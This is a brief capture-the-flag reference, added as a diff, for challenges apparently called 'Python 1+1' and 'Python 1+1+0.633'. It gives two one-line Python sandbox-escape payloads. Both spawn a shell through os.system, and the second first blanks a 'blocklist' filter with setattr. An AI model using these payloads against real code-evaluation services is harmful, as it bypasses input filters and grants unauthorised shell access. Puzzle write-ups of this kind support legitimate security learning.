@@ -1,0 +1,11 @@
+20 Jan 2024, 12:24 pm
+Reference for Return of Python 1+1+0.633
+This is not a hint. If you are trying the easier versions of Return of Python 1+1+0.633, please consider the following writeup for your own reference. Note that both payloads won't work in Return of Python 1+1+0.633.
+
+For Python 1+1:
+
+__import__("os").system("sh")
+For Python 1+1+0.633:
+
+setattr(__import__("__main__"), "blocklist", "")
+__import__("os").system("sh")
